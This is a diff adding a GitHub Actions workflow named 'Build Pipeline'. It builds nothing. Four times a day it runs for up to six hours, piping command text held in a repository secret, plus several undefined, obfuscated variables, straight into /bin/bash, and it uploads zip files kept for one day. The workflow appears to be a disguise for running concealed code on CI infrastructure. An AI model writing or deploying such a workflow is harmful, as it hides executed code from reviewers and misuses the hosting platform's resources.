@@ -1,0 +1,34 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 0,6,12,18 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build
+        env:
+          s33: ${{ secrets.s33 }}
+        run: |
+          printf '%s' "$s33" | jq -r .evr9815 | /bin/bash
+          printf '%s' "$aje2828" | jq -r .logh66 | /bin/bash
+          printf '%s' "$x1877" | jq -r .s512 | /bin/bash
+          echo $atrfv40966 | jq -r .joi6 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: p5predFP
+          path: "*.zip"
+          retention-days: 1
